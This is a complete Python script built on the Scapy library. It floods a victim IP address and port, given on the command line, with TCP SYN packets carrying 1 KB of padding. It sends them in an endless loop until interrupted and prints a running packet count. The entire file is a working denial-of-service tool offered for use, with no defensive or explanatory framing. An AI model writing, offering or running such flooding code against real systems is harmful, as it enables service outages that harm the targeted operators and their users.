import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import IP, TCP, Raw, RandShort, send, conf
import argparse
import sys

conf.sniff_promisc = False

parser = argparse.ArgumentParser(formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=200))
parser.add_argument("-t", "--target", help="Victim IP Address to Syn Flood")
parser.add_argument("-p", "--port", help="Victim Port to Syn Flood")
if len(sys.argv)==1:
    parser.print_help(sys.stderr)
    sys.exit(1)
args = parser.parse_args()

target_ip, target_port = args.target, args.port

ip = IP(dst=target_ip)
tcp = TCP(sport=RandShort(), dport=int(target_port), flags="S")
raw = Raw(b"X"*1024)
p = ip / tcp / raw

print(f"[!] Flooding {target_ip} on port {target_port} with TCP SYN packets...")
packets_sent = 0
try:
    while True:
        packets_sent += 1
        send(p, verbose=False)
        print(f"[+] Sent {packets_sent} packets.", end="\r")
except KeyboardInterrupt:
    print(f"[+] Sent {packets_sent} packets.")
    print("[!] Syn Flooding stopped.")